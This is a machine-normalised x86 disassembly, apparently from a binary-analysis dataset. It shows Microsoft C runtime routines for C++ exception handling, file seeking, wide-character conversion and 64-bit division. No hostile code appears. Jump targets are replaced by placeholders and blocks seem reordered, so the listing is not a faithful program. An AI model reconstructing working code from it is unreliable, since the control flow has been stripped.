mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_419239
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_419ca2
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_418fed
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_4192fd
push 0x2c
push r--data
call sub_4143e0
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_410a38
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_41371e
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_41371e
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_41371e
mov [ eax + 0x88 ] esi
call sub_41371e
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_410add
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_419423
mov eax [ ebp - 0x1c ]
call sub_414425
retn
sub_419396
mov esp [ ebp - 0x18 ]
call sub_41371e
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_419095
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_419423
mov eax [ ebp - 0x1c ]
call sub_414425
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_419423
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_410a8b
pop ecx
call sub_41371e
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_41371e
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_410a64
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_4191bb
pop ecx
pop ecx
sub_419499
push 0xc
push r--data
call sub_4143e0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_419ca2
push ebx
push esi
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_41df32
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_40fdd0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_41df32
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_419210
pop ecx
pop ecx
push eax
push esi
call sub_40fdd0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_414425
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_419210
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_419618
push 0x8
push r--data
call sub_4143e0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_419210
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_410789
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_419499
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414425
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_419210
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_410789
jmp r-xdata
sub_4196aa
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_419618
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_410757
call sub_410790
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_419095
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4192fd
add esp 0x28
test eax eax
je r-xdata
sub_419718
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_41371e
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_41371e
lea edi [ eax + 0x80 ]
call sub_41348c
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_4109c3
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_419ca2
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41084d
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4196aa
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_41980c
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_419ca2
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_41371e
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_419ca2
call sub_419c56
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_419718
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_41371e
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_41371e
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_41371e
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_41df32
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_4109c3
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_419ca2
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_4191bb
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_41371e
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_41371e
mov edi [ eax + 0x94 ]
call sub_41371e
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_419239
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_419239
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40f970
test al al
jne r-xdata
call sub_419ca2
cmp eax 0x19930522
jne r-xdata
call sub_41371e
call sub_41371e
call sub_41371e
mov [ eax + 0x88 ] esi
call sub_41371e
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_418fed
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4191bb
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_418f9d
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_41070b
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_4196aa
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_410790
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_419095
add esp 0x10
push [ esi + 0x1c ]
call sub_4192b4
sub_419b70
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41371e
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_41980c
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_419095
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_419ca2
push 0x8
push r--data
call sub_4143e0
push [ rw-data ]
call sub_413495
pop ecx
test eax eax
je r-xdata
call sub_419c56
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_419cf0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41c070
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41c070
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_419d3c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_417676
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_410cee
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_410d14
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_419dc1
push 0x14
push r--data
call sub_4143e0
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
call sub_410cee
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_414425
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_4176ed
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_410d01
mov [ eax ] edi
call sub_410cee
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419d3c
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419ed0
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_419eda
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_413ed3
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_419f23
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_410cee
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_419f87
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_41341a
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_419fbe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_410cee
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_410cee
mov [ eax ] 0x2a
call sub_410cee
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_410cee
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_414890
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_414890
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41a147
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41a1a0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_41a235
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_410cee
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
sub_41a2ea
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
